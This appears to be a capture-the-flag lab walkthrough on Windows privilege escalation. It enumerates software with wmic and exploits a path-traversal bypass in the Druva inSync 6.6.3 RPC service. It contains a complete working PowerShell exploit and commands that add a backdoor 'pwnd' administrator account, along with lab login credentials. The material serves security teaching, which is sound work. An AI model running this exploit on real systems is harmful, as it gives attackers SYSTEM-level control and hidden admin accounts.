# Abusing Vulnerable Software

## Prerequisites
Make sure to click the **Start Machine** button before you continue, which will deploy the target machine in split-view. If you prefer connecting to the machine via RDP, you can use the following credentials:

- **Username:** `thm-unpriv`
- **Password:** `Password321`

---

## Unpatched Software
Software installed on the target system can present various privilege escalation opportunities. As with drivers, organizations and users may not update them as often as they update the operating system. You can use the `wmic` tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```bash
wmic product get name,version,vendor
```

> **Note:** The `wmic product` command may not return all installed programs. Depending on how some programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services, or any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can search for existing exploits on the installed software online on sites like [Exploit-DB](https://www.exploit-db.com/), [Packet Storm](https://packetstormsecurity.com/), or even Google.

### Task
Using `wmic` and Google, can you find a known vulnerability on any installed product?

---

## Case Study: Druva inSync 6.6.3

The target server is running **Druva inSync 6.6.3**, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability stems from a bad patch applied over another vulnerability initially reported for version 6.5.0 by Chris Lyne.

### Vulnerability Details
The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port `6064` with `SYSTEM` privileges, accessible from localhost only. RPC allows a process to expose functions (procedures) over the network so that other machines can call them remotely.

In the case of Druva inSync:
- Procedure number `5` on port `6064` allows anyone to request the execution of any command.
- Since the RPC server runs as `SYSTEM`, any command gets executed with `SYSTEM` privileges.

#### Original Vulnerability
The original vulnerability (versions 6.5.0 and prior) allowed any command to be run without restrictions. The intended functionality was to remotely execute specific binaries provided with inSync, but no checks were made to enforce this.

#### Patch Bypass
A patch was issued to check that executed commands started with the string `C:\ProgramData\Druva\inSync4\`. However, this was insufficient as a path traversal attack could bypass the control. For example:
- To execute `C:\Windows\System32\cmd.exe`, you could use:
    ```
    C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
    ```

---

## Exploit Walkthrough

To exploit this vulnerability, we need to communicate with port `6064`. The protocol is straightforward, and the packets to be sent are as follows:

1. **Hello Packet**: Contains a fixed string.
2. **Procedure Packet**: Indicates that we want to execute procedure number `5`.
3. **Command Length Packet**: Specifies the length of the command.
4. **Command Packet**: Contains the command string to be executed.

### Exploit Code
The following PowerShell exploit can be used to elevate privileges and retrieve the task's flag:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Usage
1. Open a PowerShell console and paste the exploit code.
2. Modify the `$cmd` variable to execute the desired payload. For example:
     ```powershell
     $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
     ```
     This will:
     - Create a user `pwnd` with the password `SimplePass123`.
     - Add the user to the `Administrators` group.

3. Verify the user creation:
     ```bash
     net user pwnd
     ```

     Example output:
     ```
     User name                    pwnd
     Account active               Yes
     Local Group Memberships      *Administrators       *Users
     ```

4. Run a command prompt as the `pwnd` user:
     - Use the `pwnd` credentials when prompted.
     - Retrieve the flag from the Administrator's desktop:
         ```bash
         type C:\Users\Administrator\Desktop\flag.txt
         ```

---

**References:**
- Original exploit by Matteo Malvica.
- Exploit available on the target machine at `C:\tools\Druva_inSync_exploit.txt`.
- [Exploit-DB](https://www.exploit-db.com/)
- [Packet Storm](https://packetstormsecurity.com/)
- [Google](https://www.google.com/)